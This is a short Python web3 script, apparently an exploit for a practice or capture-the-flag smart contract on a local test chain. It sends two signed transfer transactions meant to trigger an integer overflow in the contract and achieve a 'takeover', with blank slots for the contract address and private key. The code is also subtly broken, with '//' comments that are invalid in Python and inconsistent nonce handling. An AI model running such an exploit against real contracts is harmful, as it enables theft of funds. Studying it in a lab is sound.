import json
from web3 import Web3

//locall rpc call
url = 'http://127.0.0.1:7545';
web3 = Web3(Web3.HTTPProvider(url));
abi2 = json.loads('[ {"inputs": [{"internalType": "uint256","name": "_value","type": "uint256"}],"stateMutability": "nonpayable","type": "constructor"},{"inputs": [],"name": "getBalance","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "getOwner","outputs": [{"internalType": "address","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [{"internalType": "uint256","name": "_amount","type": "uint256"}],"name": "transfer","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "nonpayable","type": "function"}]')


#smart address
address = ""

//account to use as a takeover
account_from = ""

//account private key
private_key = ""
contract = web3.eth.contract(address=address,abi=abi2)
nonce = web3.eth.getTransactionCount(address)

print('Get Balance msg.sender: ', contract.functions.getBalance().call())
#need to put .call() at the end to call the contract
totalOwner = contract.functions.getOwner().call()

#Tx need to be send 2 times to cause overflown
transaction = contract.functions.transfer(21).buildTransaction(
    {

        "chainId" : 7545,
        "from" : account_from,
        "nonce" : 0
    }
)

#result
signed_trans = web3.eth.account.signTransaction(transaction, private_key=private_key)
transaction_hash = web3.eth.sendRawTransaction(signed_trans.rawTransaction)
transaction_receipt = web3.eth.waitForTransactionReceipt(transaction_hash)

#Tx need to be send 2 times to cause overflown
transaction = contract.functions.transfer(20).buildTransaction(
    {

        "chainId" : 7545,
        "from" : account_from,
        "nonce" : 1
    }
)

#result
signed_trans = web3.eth.account.signTransaction(transaction, private_key=private_key)
transaction_hash = web3.eth.sendRawTransaction(signed_trans.rawTransaction)
transaction_receipt = web3.eth.waitForTransactionReceipt(transaction_hash)



print('Contract Owner: ',totalOwner)
print('Signed Tx: ',signed_trans)
print('Receipt: ',transaction_receipt)
